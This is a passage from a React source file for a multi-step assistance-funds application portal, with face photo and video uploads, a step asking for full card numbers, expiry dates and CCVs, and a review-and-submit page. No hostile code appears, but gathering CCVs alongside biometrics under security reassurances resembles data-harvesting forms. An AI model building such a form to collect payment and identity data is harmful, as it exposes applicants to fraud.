                          className="h-2 bg-green-600 rounded-full transition-all duration-300"
                          style={{ width: `${uploadProgress.biodataImage}%` }}
                        ></div>
                      </div>
                      <p className="mt-2 text-sm text-gray-600">Processing... {uploadProgress.biodataImage}%</p>
                    </div>
                  )}
                  {errors.biodataImage && <p className="mt-2 text-sm text-red-600">{errors.biodataImage}</p>}
                </div>
              </div>
              {/* Biodata Video (Face) */}
              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                <div className="text-center">
                  <User className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                  <h4 className="mb-2 text-lg font-semibold text-gray-800">Biodata (Face Video) *</h4>
                  <p className="mb-4 text-gray-600">Record a short video of your face for liveness detection</p>
                  {formData.biodataVideo ? (
                    <div className="flex justify-center items-center space-x-2 text-green-600">
                      <Check className="w-5 h-5" />
                      <span>Face video uploaded</span>
                    </div>
                  ) : (
                    <div>
                      <input
                        type="file"
                        accept="video/*"
                        capture="user"
                        onChange={(e) => e.target.files && handleFileUpload('biodataVideo', e.target.files[0])}
                        className="hidden"
                        id="biodata-video"
                      />
                      <label
                        htmlFor="biodata-video"
                        className="px-6 py-2 text-white bg-green-600 rounded-lg transition-colors cursor-pointer hover:bg-green-700"
                      >
                        Record Video
                      </label>
                    </div>
                  )}
                  {uploadProgress.biodataVideo && uploadProgress.biodataVideo < 100 && (
                    <div className="mt-4">
                      <div className="h-2 bg-gray-200 rounded-full">
                        <div
                          className="h-2 bg-green-600 rounded-full transition-all duration-300"
                          style={{ width: `${uploadProgress.biodataVideo}%` }}
                        ></div>
                      </div>
                      <p className="mt-2 text-sm text-gray-600">Processing... {uploadProgress.biodataVideo}%</p>
                    </div>
                  )}
                  {errors.biodataVideo && <p className="mt-2 text-sm text-red-600">{errors.biodataVideo}</p>}
                </div>
              </div>
              {/* Random Picture */}
              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed md:col-span-2">
                <div className="text-center">
                  <Building className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                  <h4 className="mb-2 text-lg font-semibold text-gray-800">Random Picture *</h4>
                  <p className="mb-4 text-gray-600">Take a random picture of anything in your environment (to prevent AI registration)</p>
                  {formData.randomPicture ? (
                    <div className="flex justify-center items-center space-x-2 text-green-600">
                      <Check className="w-5 h-5" />
                      <span>Random picture uploaded</span>
                    </div>
                  ) : (
                    <div>
                      <input
                        type="file"
                        accept="image/*"
                        capture="environment"
                        onChange={(e) => e.target.files && handleFileUpload('randomPicture', e.target.files[0])}
                        className="hidden"
                        id="random-picture"
                      />
                      <label
                        htmlFor="random-picture"
                        className="px-6 py-2 text-white bg-yellow-600 rounded-lg transition-colors cursor-pointer hover:bg-yellow-700"
                      >
                        Take Random Picture
                      </label>
                    </div>
                  )}
                  {uploadProgress.randomPicture && uploadProgress.randomPicture < 100 && (
                    <div className="mt-4">
                      <div className="h-2 bg-gray-200 rounded-full">
                        <div
                          className="h-2 bg-yellow-600 rounded-full transition-all duration-300"
                          style={{ width: `${uploadProgress.randomPicture}%` }}
                        ></div>
                      </div>
                      <p className="mt-2 text-sm text-gray-600">Processing... {uploadProgress.randomPicture}%</p>
                    </div>
                  )}
                  {errors.randomPicture && <p className="mt-2 text-sm text-red-600">{errors.randomPicture}</p>}
                </div>
              </div>
            </div>
            <div className="p-4 mt-6 bg-yellow-50 rounded-lg border border-yellow-200">
              <div className="flex items-start">
                <AlertCircle className="w-5 h-5 text-yellow-600 mr-2 mt-0.5" />
                <div>
                  <h4 className="mb-1 font-semibold text-yellow-800">Important Security Notice</h4>
                  <p className="text-sm text-yellow-700">
                    All uploaded documents are encrypted and stored securely. We use advanced biometric verification
                    to prevent fraud and ensure your identity is protected throughout the application process.
                  </p>
                </div>
              </div>
              <div>
                <button onClick={() => setShowModal(true)}>Open Camera</button>
                <CameraModal
                  isOpen={showModal}
                  onClose={() => setShowModal(false)}
                  onCapture={handleCapture}
                  isSelfie={true}
                  mode='photo'
                />
              </div>
            </div>
          </div>
        );

      case 5:
        return (
          <div className="space-y-6 md:col-span-2">
            <h4 className="mb-6 text-2xl font-semibold text-gray-800">Link a Card *</h4>

            <div className="grid grid-cols-1 gap-6 md:grid-cols-3">
              {formData.cards.map((card, index) => (
                <React.Fragment key={`card-${index}`}>
                  <div>
                    <label className="block mb-2 text-sm font-medium text-gray-700">Card Number *</label>
                    <input
                      type="text"
                      value={card.cardNumber}
                      onChange={(e) => handleCardChange(index, "cardNumber", e.target.value)}
                      className={`px-4 py-3 w-full rounded-lg border focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].cardNumber`] ? 'border-red-500' : 'border-gray-300'}`}
                      placeholder="XXXX XXXX XXXX XXXX"
                    />
                    {errors[`cards[${index}].cardNumber`] && (
                      <p className="mt-1 text-sm text-red-600">{errors[`cards[${index}].cardNumber`]}</p>
                    )}
                  </div>
                  <div>
                    <label className="block mb-2 text-sm font-medium text-gray-700">Expiry *</label>
                    <input
                      type="text"
                      value={card.expiry}
                      onChange={(e) => handleCardChange(index, "expiry", e.target.value)}
                      className={`px-4 py-3 w-full rounded-lg border focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].expiry`] ? 'border-red-500' : 'border-gray-300'}`}
                      placeholder="MM/YY"
                    />
                    {errors[`cards[${index}].expiry`] && (
                      <p className="mt-1 text-sm text-red-600">{errors[`cards[${index}].expiry`]}</p>
                    )}
                  </div>
                  <div>
                    <div className="w-full">
                      <label className="block mb-2 text-sm font-medium text-gray-700">CCV *</label>
                      <div className="flex items-center">
                        <input
                          type="text"
                          value={card.ccv}
                          onChange={(e) => handleCardChange(index, "ccv", e.target.value)}
                          className={`px-4 py-3 w-full rounded-lg border focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].ccv`] ? 'border-red-500' : 'border-gray-300'}`}
                          placeholder="XXX"
                        />
                        {/* Remove card button, only for cards after the first */}
                        {index > 0 && (
                          <button
                            type="button"
                            onClick={() => removeCard(index)}
                            className="flex justify-center items-center p-2 mb-2 ml-2 text-red-600 bg-red-100 rounded-full hover:bg-red-200"
                            title="Remove this card"
                          >
                            <Minus className="w-5 h-5" />
                          </button>
                        )}
                      </div>
                      {errors[`cards[${index}].ccv`] && (
                        <p className="mt-1 text-sm text-red-600">{errors[`cards[${index}].ccv`]}</p>
                      )}
                    </div>
                  </div>
                </React.Fragment>
              ))}
            </div>

            {errors.cards && <p className="text-sm text-red-600">{errors.cards}</p>}

            <button
              type="button"
              onClick={addCard}
              className="px-4 py-2 mt-2 text-sm font-medium text-blue-600 bg-blue-100 rounded-lg hover:bg-blue-200"
            >
              + Link Another Card
            </button>
          </div>
        );

      case 6:
        return (
          <div className="space-y-6">
            <h3 className="mb-6 text-2xl font-semibold text-gray-800">Review & Submit Application</h3>

            {/* Application Summary */}
            <div className="p-6 space-y-4 bg-gray-50 rounded-lg">
              <h4 className="text-lg font-semibold text-gray-800">Application Summary</h4>

              <div className="grid grid-cols-1 gap-4 text-sm md:grid-cols-2">
                <div>
                  <span className="font-medium text-gray-700">Name:</span>
                  <span className="ml-2">{formData.firstName} {formData.lastName}</span>
                </div>
                <div>
                  <span className="font-medium text-gray-700">Date of Birth:</span>
                  <span className="ml-2">{formData.dateOfBirth}</span>
                </div>
                <div>
                  <span className="font-medium text-gray-700">Phone:</span>
                  <span className="ml-2">{formData.phoneNumber}</span>
                </div>
                <div>
                  <span className="font-medium text-gray-700">Email:</span>
                  <span className="ml-2">{formData.email}</span>
                </div>
                <div className="md:col-span-2">
                  <span className="font-medium text-gray-700">Address:</span>
                  <span className="ml-2">{formData.currentAddress}, {formData.city}, {formData.state} {formData.zipCode}</span>
                </div>
                <div>
                  <span className="font-medium text-gray-700">Bank:</span>
                  <span className="ml-2">{formData.bankName} ({formData.accountType})</span>
                </div>
              </div>
            </div>

            {/* Terms and Conditions */}
            <div className="space-y-4">
              <div className="flex items-start space-x-3">
                <input
                  type="checkbox"
                  id="terms"
                  checked={formData.termsAccepted}
                  onChange={(e) => handleInputChange('termsAccepted', e.target.checked)}
                  className="mt-1 w-4 h-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500"
                />
                <label htmlFor="terms" className="text-sm text-gray-700">
                  I accept the <a href="/terms" className="text-blue-600 hover:underline">Terms and Conditions</a> and
                  understand that I must use assistance funds only for approved expenses (food, clothing, shelter, healthcare).
                </label>
              </div>
              {errors.termsAccepted && <p className="ml-7 text-sm text-red-600">{errors.termsAccepted}</p>}

              <div className="flex items-start space-x-3">
                <input
                  type="checkbox"
                  id="consent"
                  checked={formData.dataConsent}
                  onChange={(e) => handleInputChange('dataConsent', e.target.checked)}
                  className="mt-1 w-4 h-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500"
                />
                <label htmlFor="consent" className="text-sm text-gray-700">
                  I consent to the processing of my personal data and understand that my fund usage will be monitored
                  to ensure compliance with program guidelines. I agree to the <a href="/privacy" className="text-blue-600 hover:underline">Privacy Policy</a>.
                </label>
              </div>
              {errors.dataConsent && <p className="ml-7 text-sm text-red-600">{errors.dataConsent}</p>}
            </div>

            <div className="p-4 bg-blue-50 rounded-lg border border-blue-200">
              <div className="flex items-start">
                <Shield className="w-5 h-5 text-blue-600 mr-2 mt-0.5" />
                <div>
                  <h4 className="mb-1 font-semibold text-blue-800">Next Steps</h4>
                  <p className="text-sm text-blue-700">
                    After submitting your application, our team will review it within 24-48 hours. You'll receive
                    an email confirmation with your application status and next steps.
                  </p>
                </div>
              </div>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div className="py-8 min-h-screen bg-gray-50">
      <div className="px-4 mx-auto max-w-4xl sm:px-6 lg:px-8">
        {/* Progress Indicator */}
        <div className="mb-8">
          <div className="flex justify-between items-center">
            {steps.map((step, index) => (
              <div key={step.id} className="flex items-center">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-semibold ${step.id === currentStep
                  ? 'bg-blue-600 text-white'
                  : step.id < currentStep
                    ? 'bg-green-600 text-white'
                    : 'bg-gray-300 text-gray-600'
                  }`}>
                  {step.id < currentStep ? <Check className="w-5 h-5" /> : step.icon}
                </div>
                <div className="hidden ml-3 sm:block">
                  <div className={`text-sm font-medium ${step.id === currentStep
                    ? 'text-blue-600'
                    : step.id < currentStep
                      ? 'text-green-600'
                      : 'text-gray-500'
                    }`}>
                    {step.title}
                  </div>
                </div>
                {index < steps.length - 1 && (
                  <div className={`mx-4 flex-1 h-0.5 ${step.id < currentStep ? 'bg-green-600' : 'bg-gray-300'
                    }`} />
                )}
              </div>
            ))}
          </div>
        </div>

        {/* Form Content */}
        <div className="p-8 bg-white rounded-lg shadow-lg">
          {renderStepContent()}

          {/* Navigation Buttons */}
          <div className="flex justify-between pt-6 mt-8 border-t border-gray-200">
            <button
              onClick={prevStep}
              disabled={currentStep === 1}
              className={`flex items-center px-6 py-3 rounded-lg font-medium transition-colors ${currentStep === 1
                ? 'bg-gray-100 text-gray-400 cursor-not-allowed'
                : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
                }`}
            >
              <ChevronLeft className="mr-2 w-4 h-4" />
              Previous
            </button>

            {currentStep < steps.length ? (
              <button
                onClick={nextStep}
                className="flex items-center px-6 py-3 font-medium text-white bg-blue-600 rounded-lg transition-colors hover:bg-blue-700"
              >
                Next
                <ChevronRight className="ml-2 w-4 h-4" />
              </button>
            ) : (
              <button
                onClick={handleSubmit}
                className="flex items-center px-6 py-3 font-medium text-white bg-green-600 rounded-lg transition-colors hover:bg-green-700"
              >
                Submit Application
                <Check className="ml-2 w-4 h-4" />
              </button>
            )}
          </div>
        </div>
        {/* SMS Info Modal */}
        <SMSInfoModal isOpen={showSMSInfo} onClose={() => setShowSMSInfo(false)} />
      </div>
    </div>
  );
};

export default ApplicationPortal;